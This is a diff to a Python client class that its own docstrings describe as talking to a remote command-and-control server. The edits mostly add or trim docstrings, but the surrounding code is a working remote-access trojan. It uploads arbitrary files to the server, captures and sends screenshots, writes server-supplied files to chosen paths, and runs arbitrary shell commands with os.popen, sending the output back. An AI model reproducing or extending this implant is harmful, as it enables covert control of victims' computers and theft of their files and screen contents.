@@ -21,16 +21,15 @@ class Client:
     """A class representing the client that connects to the server via sockets.
 
     Attributes:
-        host (str): The IP address of the remote C&C server
-        port (int): The port to connect to the remote C&C server
+        host (str): The IP address of the remote C&C server.
+        port (int): The port to connect to the remote C&C server.
+        server_socket (socket): The connection object that will contain the relevant data sent by the server and client bidirectionally.
+        control_socket (socket): The connection object that will handle control information, such as client state, OS information.
     """
 
     def __init__(self, ip, port):
-        """Initializes a new instance of the Client class.
-
-        Args:
-        ip (str): The IP address of the remote C&C server
-        port (int): The port to connect to the remote C&C server
+        """
+        Initializes a new instance of the Client class.
         """
         self.host = ip
         self.port = port
@@ -64,6 +63,10 @@ class Client:
         self.server_socket.close()
 
     def listenForCommands(self):
+        """
+        Handles the process of receiving instructions from the C&C, performs the necessary actions and send back the requested information.
+        """
+
         data = self.server_socket.recv(1024)
 
         if not data:
@@ -77,7 +80,6 @@ class Client:
         if data.startswith(b"download"):
             file = data[8:].decode()
             print("Server has downloaded file "+Fore.RED+"{}".format(file)+Style.RESET_ALL)
-
             with open(file, 'rb') as f:
             	chunk = f.read(1024)
             	while chunk:
@@ -94,9 +96,7 @@ class Client:
                 self.executeAndSend('ifconfig')
 
         if data.startswith(b"screenshot"):
-            # Take a screenshot and save it as PNG
-
-
+            # Take a screenshot and save it as PNG into the buffer
             screenshot = ImageGrab.grab()
             buffer = io.BytesIO()
             screenshot.save(buffer, format='PNG')
@@ -113,9 +113,6 @@ class Client:
             start_index = data.find(start_str)
             end_index = data.find(end_str)
             path = data[start_index + len(start_str):end_index].decode()
-
-            print(path)
-
             contents = data[end_index+len(end_str):]
             self.server_socket.settimeout(2)
             with open(path, 'wb') as f:
@@ -136,6 +133,10 @@ class Client:
                 return
 
     def executeAndSend(self, command):
+        """
+        Handles the case of running a system command, sending the data back to the server
+        """
+
         output = os.popen(command).read()
         print("Running command "+ Fore.RED + "{}".format(command) + Style.RESET_ALL)
         self.server_socket.send(output.encode('utf-8'))
